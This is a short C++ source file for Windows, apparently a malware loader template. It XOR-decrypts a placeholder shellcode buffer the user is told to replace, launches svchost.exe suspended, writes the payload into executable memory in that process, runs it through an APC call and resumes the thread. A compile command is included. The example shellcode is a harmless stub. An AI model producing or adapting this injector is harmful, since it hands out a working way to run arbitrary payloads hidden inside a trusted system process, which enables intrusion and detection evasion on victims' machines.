// Save as: injector.cpp
#include <Windows.h>
#include <TlHelp32.h>

// XOR-decrypt payload (replace with your own)
unsigned char payload[] = { 0x90, 0x90, 0xCC, 0xC3 };  // Example shellcode
unsigned int payload_len = 4;

void XORDecrypt(unsigned char* data, unsigned int len, unsigned char key) {
    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    // Decrypt payload (key: 0x41)
    XORDecrypt(payload, payload_len, 0x41);

    // Target process (svchost.exe)
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Hollow process and inject payload
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteMem, payload, payload_len, NULL);
    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, NULL);
    ResumeThread(pi.hThread);

    return 0;
}



//g++ injector.cpp -o injector.exe -static -lwinmm

